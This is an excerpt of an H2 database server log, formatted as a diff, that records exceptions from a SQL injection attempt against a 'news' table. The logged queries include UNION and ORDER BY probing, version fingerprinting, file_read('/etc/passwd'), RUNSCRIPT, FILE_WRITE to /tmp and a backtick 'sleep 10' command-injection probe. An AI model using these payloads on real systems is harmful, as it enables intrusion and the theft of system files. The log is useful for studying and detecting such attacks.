+SELECT * FROM news WHERE id='1' union select 1,2,3,4--' [22018-191]
+2016-05-02 12:41:19 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "Hello Wolrd:)"; SQL statement:
+SELECT * FROM news WHERE id='1' union select 1,2,3,4--' [22018-191]
+2016-05-02 12:41:21 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Order by expression "5" must be in the result list in this case; SQL statement:
+SELECT * FROM news WHERE id='1' order by 5--' [90068-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.command.dml.Query.prepareOrder(Query.java:495)
+	at org.h2.command.dml.Select.prepare(Select.java:847)
+	at org.h2.command.Parser.prepareCommand(Parser.java:257)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-02 12:41:22 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Order by expression "43" must be in the result list in this case; SQL statement:
+SELECT * FROM news WHERE id='1' order by 43--' [90068-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.command.dml.Query.prepareOrder(Query.java:495)
+	at org.h2.command.dml.Select.prepare(Select.java:847)
+	at org.h2.command.Parser.prepareCommand(Parser.java:257)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-02 12:41:32 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1a"; SQL statement:
+SELECT * FROM news WHERE id='1a' union select null,null,null,null--' [22018-191]
+2016-05-02 12:41:40 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "PostgreSQL 8.1.4  server protocol using H2 1.4.191 (2016-01-21)"; SQL statement:
+SELECT * FROM news WHERE id='1' or 1=1 union select null,null,null,version()--' [22018-191]
+2016-05-02 12:41:43 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM NEWS WHERE ID='1' OR 1=1 UNION SELECT NULL,NULL,NULL,@@[*]VERSION  ' "; expected "identifier"; SQL statement:
+SELECT * FROM news WHERE id='1' or 1=1 union select null,null,null,@@version--' [42001-191]
+2016-05-02 12:41:48 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM NEWS WHERE ID='1' OR 1=1 UNION SELECT NULL,NULL,VERSION(0,1  ' [*]"; expected "[, ::, *, /, %, +, -, ||, ~, !~, NOT, LIKE, REGEXP, IS, IN, BETWEEN, AND, OR, ), ,"; SQL statement:
+SELECT * FROM news WHERE id='1' or 1=1 union select null,null,version(0,1--' [42001-191]
+2016-05-02 12:42:19 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~~~~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' [22018-191]
+2016-05-02 12:42:20 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~~~~~~'[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~'' [42000-191]
+2016-05-02 12:42:27 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 order by 21[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 order by 21' [42000-191]
+2016-05-02 12:42:28 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 order by 1[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 order by 1' [42000-191]
+2016-05-02 12:42:28 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 order by 1#[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 order by 1#' [42000-191]
+2016-05-02 12:42:29 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 order by 1[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 order by 1' [42000-191]
+2016-05-02 12:42:35 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "Hello Wolrd:)"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 union select 1,2,3,4--' [22018-191]
+2016-05-02 12:42:57 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM NEWS WHERE ID='1~~~~~~~~' AND 1=2 UNION SELECT NULL,NULL,,[*]NULL  ' "; expected "*, NOT, EXISTS, INTERSECTS, SELECT, FROM"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' and 1=2 union select null,null,,null--' [42001-191]
+2016-05-02 12:42:59 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM NEWS WHERE ID='1~~~~~~~~' OR 1=1 UNION SELECT NULL,NULL,,[*]NULL  ' "; expected "*, NOT, EXISTS, INTERSECTS, SELECT, FROM"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 union select null,null,,null--' [42001-191]
+2016-05-02 12:43:00 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM NEWS WHERE ID='1~~~~~~~~' OR 1=1 UNION SELECT NULL,NULL,,[*]NULL  ' "; expected "*, NOT, EXISTS, INTERSECTS, SELECT, FROM"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 union select null,null,,null--' [42001-191]
+2016-05-02 12:43:06 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM NEWS WHERE ID='1~~~~~~~~' OR 1=1 UNION SELECT NULL,NULL,VERSION(0,NULL  ' [*]"; expected "[, ::, *, /, %, +, -, ||, ~, !~, NOT, LIKE, REGEXP, IS, IN, BETWEEN, AND, OR, ), ,"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 union select null,null,version(0,null--' [42001-191]
+2016-05-03 10:46:59 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~' [22018-191]
+2016-05-03 10:46:59 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~~"; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~' [22018-191]
+2016-05-03 10:47:00 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~' [22018-191]
+2016-05-03 10:47:00 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~~~"; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~' [22018-191]
+2016-05-03 10:49:03 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Order by expression "5" must be in the result list in this case; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 order by 5--' [90068-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.command.dml.Query.prepareOrder(Query.java:495)
+	at org.h2.command.dml.Select.prepare(Select.java:847)
+	at org.h2.command.Parser.prepareCommand(Parser.java:257)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-03 10:49:13 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,NULL,NULL  ' "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,null,null--' [42000-191]
+2016-05-03 10:49:18 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~~~~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' union select null,null,null,null--' [22018-191]
+2016-05-03 10:49:18 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' UNION[*] SELECT NULL,NULL,NULL,NULL  ' "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' union select null,null,null,null--' [42000-191]
+2016-05-03 10:49:18 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,NULL,NULL  ' "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,null,null--' [42000-191]
+2016-05-03 10:49:22 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,NULL,NULL  ' "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,null,null--' [42000-191]
+2016-05-03 10:49:25 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,VERSION(),NULL  ' "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,version(),null--' [42000-191]
+2016-05-03 10:49:32 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: IO Exception: "java.io.FileNotFoundException:  (No such file or directory)"; ; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 union select null,null,file_read(''),null--' [90031-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:168)
+	at org.h2.message.DbException.convertIOException(DbException.java:330)
+	at org.h2.expression.Function.getValueWithArgs(Function.java:1615)
+	at org.h2.expression.Function.getValue(Function.java:584)
+	at org.h2.command.dml.Select.queryFlat(Select.java:548)
+	at org.h2.command.dml.Select.queryWithoutCache(Select.java:654)
+	at org.h2.command.dml.Query.query(Query.java:341)
+	at org.h2.command.dml.Query.query(Query.java:309)
+	at org.h2.command.dml.SelectUnion.queryWithoutCache(SelectUnion.java:209)
+	at org.h2.command.dml.SelectUnion.query(SelectUnion.java:440)
+	at org.h2.command.dml.Query.query(Query.java:309)
+	at org.h2.command.dml.Query.query(Query.java:36)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:110)
+	at org.h2.command.Command.executeQuery(Command.java:201)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:179)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: java.io.FileNotFoundException:  (No such file or directory)
+	at java.io.FileInputStream.open0(Native Method)
+	at java.io.FileInputStream.open(FileInputStream.java:195)
+	at java.io.FileInputStream.<init>(FileInputStream.java:138)
+	at java.io.FileInputStream.<init>(FileInputStream.java:93)
+	at org.h2.store.fs.FilePathDisk.newInputStream(FilePathDisk.java:321)
+	at org.h2.store.fs.FileUtils.newInputStream(FileUtils.java:218)
+	at org.h2.expression.Function.getValueWithArgs(Function.java:1600)
+	... 16 more
+2016-05-03 10:49:32 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_READ(''),NULL  ' "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,file_read(''),null--' [42000-191]
+2016-05-03 10:49:33 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_READ('/etc/passwd'),NULL  ' "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,file_read('/etc/passwd'),null--' [42000-191]
+2016-05-03 10:54:22 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_READ('/etc/passwd'),NULL  ' "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,file_read('/etc/passwd'),null--' [42000-191]
+2016-05-03 11:06:24 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_READ('/etc/passwd'),NULL  ' "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,file_read('/etc/passwd'),null--' [42000-191]
+2016-05-03 11:06:25 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "[*]'"; SQL statement:
+' [42000-191]
+2016-05-03 11:06:25 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_READ('/etc/passwd'),NULL "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,file_read('/etc/passwd'),null [42000-191]
+2016-05-03 11:06:27 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "select 1[*]'"; SQL statement:
+select 1' [42000-191]
+2016-05-03 11:06:27 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_READ('/etc/passwd'),NULL "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,file_read('/etc/passwd'),null [42000-191]
+2016-05-03 11:06:27 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_READ('/etc/passwd'),NULL "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,file_read('/etc/passwd'),null [42000-191]
+2016-05-03 11:06:55 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "RUNSCRIPT FROM 'backup.sql'[*]'"; SQL statement:
+RUNSCRIPT FROM 'backup.sql'' [42000-191]
+2016-05-03 11:06:55 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_READ('/etc/passwd'),NULL "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,file_read('/etc/passwd'),null [42000-191]
+2016-05-03 11:06:59 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "RUNSCRIPT FROM 'backup.sql'[*]'"; SQL statement:
+RUNSCRIPT FROM 'backup.sql'' [42000-191]
+2016-05-03 11:06:59 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_READ('/etc/passwd'),NULL "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,file_read('/etc/passwd'),null [42000-191]
+2016-05-03 11:07:05 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: IO Exception: "java.io.FileNotFoundException: backup.sql (No such file or directory)"; "backup.sql"; SQL statement:
+RUNSCRIPT FROM 'backup.sql'--' [90031-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:168)
+	at org.h2.message.DbException.convertIOException(DbException.java:330)
+	at org.h2.command.dml.ScriptBase.openInput(ScriptBase.java:169)
+	at org.h2.command.dml.RunScriptCommand.update(RunScriptCommand.java:44)
+	at org.h2.command.CommandContainer.update(CommandContainer.java:98)
+	at org.h2.command.Command.executeUpdate(Command.java:258)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:184)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: java.io.FileNotFoundException: backup.sql (No such file or directory)
+	at java.io.FileInputStream.open0(Native Method)
+	at java.io.FileInputStream.open(FileInputStream.java:195)
+	at java.io.FileInputStream.<init>(FileInputStream.java:138)
+	at java.io.FileInputStream.<init>(FileInputStream.java:93)
+	at org.h2.store.fs.FilePathDisk.newInputStream(FilePathDisk.java:321)
+	at org.h2.store.fs.FileUtils.newInputStream(FileUtils.java:218)
+	at org.h2.command.dml.ScriptBase.openInput(ScriptBase.java:167)
+	... 8 more
+2016-05-03 11:07:05 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_READ('/etc/passwd'),NULL "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,file_read('/etc/passwd'),null [42000-191]
+2016-05-03 11:07:07 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: IO Exception: "java.io.FileNotFoundException: backup.sql (No such file or directory)"; "backup.sql"; SQL statement:
+RUNSCRIPT FROM 'backup.sql' [90031-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:168)
+	at org.h2.message.DbException.convertIOException(DbException.java:330)
+	at org.h2.command.dml.ScriptBase.openInput(ScriptBase.java:169)
+	at org.h2.command.dml.RunScriptCommand.update(RunScriptCommand.java:44)
+	at org.h2.command.CommandContainer.update(CommandContainer.java:98)
+	at org.h2.command.Command.executeUpdate(Command.java:258)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:184)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: java.io.FileNotFoundException: backup.sql (No such file or directory)
+	at java.io.FileInputStream.open0(Native Method)
+	at java.io.FileInputStream.open(FileInputStream.java:195)
+	at java.io.FileInputStream.<init>(FileInputStream.java:138)
+	at java.io.FileInputStream.<init>(FileInputStream.java:93)
+	at org.h2.store.fs.FilePathDisk.newInputStream(FilePathDisk.java:321)
+	at org.h2.store.fs.FileUtils.newInputStream(FileUtils.java:218)
+	at org.h2.command.dml.ScriptBase.openInput(ScriptBase.java:167)
+	... 8 more
+2016-05-03 11:07:07 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_READ('/etc/passwd'),NULL "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,file_read('/etc/passwd'),null [42000-191]
+2016-05-03 11:07:08 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: IO Exception: "java.io.FileNotFoundException: backup.sql (No such file or directory)"; "backup.sql"; SQL statement:
+RUNSCRIPT FROM 'backup.sql' [90031-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:168)
+	at org.h2.message.DbException.convertIOException(DbException.java:330)
+	at org.h2.command.dml.ScriptBase.openInput(ScriptBase.java:169)
+	at org.h2.command.dml.RunScriptCommand.update(RunScriptCommand.java:44)
+	at org.h2.command.CommandContainer.update(CommandContainer.java:98)
+	at org.h2.command.Command.executeUpdate(Command.java:258)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:184)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: java.io.FileNotFoundException: backup.sql (No such file or directory)
+	at java.io.FileInputStream.open0(Native Method)
+	at java.io.FileInputStream.open(FileInputStream.java:195)
+	at java.io.FileInputStream.<init>(FileInputStream.java:138)
+	at java.io.FileInputStream.<init>(FileInputStream.java:93)
+	at org.h2.store.fs.FilePathDisk.newInputStream(FilePathDisk.java:321)
+	at org.h2.store.fs.FileUtils.newInputStream(FileUtils.java:218)
+	at org.h2.command.dml.ScriptBase.openInput(ScriptBase.java:167)
+	... 8 more
+2016-05-03 11:07:08 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_READ('/etc/passwd'),NULL "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,file_read('/etc/passwd'),null [42000-191]
+2016-05-03 11:07:32 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement """SLEEP 10""[*] "; expected "SELECT, SET, SAVEPOINT, SCRIPT, SHUTDOWN, SHOW, {"; SQL statement:
+`sleep 10` [42001-191]
+2016-05-03 11:07:32 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_READ('/etc/passwd'),NULL "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,file_read('/etc/passwd'),null [42000-191]
+2016-05-03 11:07:35 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement """SLEEP 10""[*] "; expected "SELECT, SET, SAVEPOINT, SCRIPT, SHUTDOWN, SHOW, {"; SQL statement:
+`sleep 10` [42001-191]
+2016-05-03 11:07:35 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_READ('/etc/passwd'),NULL "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,file_read('/etc/passwd'),null [42000-191]
+2016-05-03 11:10:39 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column "xx" not found; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 union select null,null,FILE_WRITE("xx", "/tmp/xxxx"),null [42122-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.expression.ExpressionColumn.optimize(ExpressionColumn.java:147)
+	at org.h2.expression.Function.optimize(Function.java:2245)
+	at org.h2.command.dml.Select.prepare(Select.java:852)
+	at org.h2.command.dml.SelectUnion.prepare(SelectUnion.java:305)
+	at org.h2.command.Parser.prepareCommand(Parser.java:257)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-03 11:10:39 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_WRITE(""xx"", ""/tmp/xxxx""),NULL "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,FILE_WRITE("xx", "/tmp/xxxx"),null [42000-191]
+2016-05-03 11:10:46 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column "xx" not found; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 union select null,null,FILE_WRITE("xx", "/tmp/xxxx"),null [42122-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.expression.ExpressionColumn.optimize(ExpressionColumn.java:147)
+	at org.h2.expression.Function.optimize(Function.java:2245)
+	at org.h2.command.dml.Select.prepare(Select.java:852)
+	at org.h2.command.dml.SelectUnion.prepare(SelectUnion.java:305)
+	at org.h2.command.Parser.prepareCommand(Parser.java:257)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-03 11:10:46 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_WRITE(""xx"", ""/tmp/xxxx""),NULL "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,FILE_WRITE("xx", "/tmp/xxxx"),null [42000-191]
+2016-05-03 11:10:56 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Hexadecimal string contains non-hex character: "xx"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 union select null,null,FILE_WRITE('xx', '/tmp/xxxx'),null [90004-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.util.StringUtils.convertHexToBytes(StringUtils.java:983)
+	at org.h2.value.Value.convertTo(Value.java:915)
+	at org.h2.value.Value.getBytesNoCopy(Value.java:420)
+	at org.h2.value.Value.getInputStream(Value.java:452)
+	at org.h2.expression.Function.getValueWithArgs(Function.java:1625)
+	at org.h2.expression.Function.getValue(Function.java:584)
+	at org.h2.command.dml.Select.queryFlat(Select.java:548)
+	at org.h2.command.dml.Select.queryWithoutCache(Select.java:654)
